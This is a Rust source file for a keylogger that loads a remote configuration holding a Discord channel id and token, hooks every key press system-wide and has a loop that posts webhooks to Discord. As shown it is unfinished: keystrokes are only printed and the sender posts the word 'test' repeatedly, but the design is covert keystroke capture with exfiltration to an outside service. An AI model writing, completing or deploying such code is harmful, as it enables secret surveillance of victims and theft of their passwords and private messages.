mod discord;
mod config;

use discord::Discord;
use config::Config;
use rdev::{listen, Event, EventType};
//use async_std::task;
use queues::{Queue, queue};

pub struct Keylogger {
	discord_client: Discord,
	queue: Queue<String>,
}

impl Keylogger {
	pub fn new(config_url: &str) -> Keylogger {
		let config: Config = Config::new(config_url);

		return Keylogger {
			discord_client: Discord::new(config.channel_id.as_str(), config.token.as_str()),
			queue: queue![],
		}
	}

	pub fn listen(&self) {
		if let Err(error) = listen(move |event: Event| {

	        //println!("{:?}", event);
	        //println!("{:?}", event.event_type);
	        //println!("{:?}", event.name);

	        match event.event_type {
	            EventType::KeyPress(_key) => {
	                let text: String = event.name.unwrap().clone();
	                println!("{:?}", text);
	                //self.queue.add(text);
	            },
	            _ => (),
	        }
	    }) {
	        println!("Error: {:?}", error);
	    }
	}

	pub fn start_sending(&self) {
	    self.discord_client.send_webhook("test");
	    loop {
	        self.discord_client.send_webhook("test");
	    }
	}
}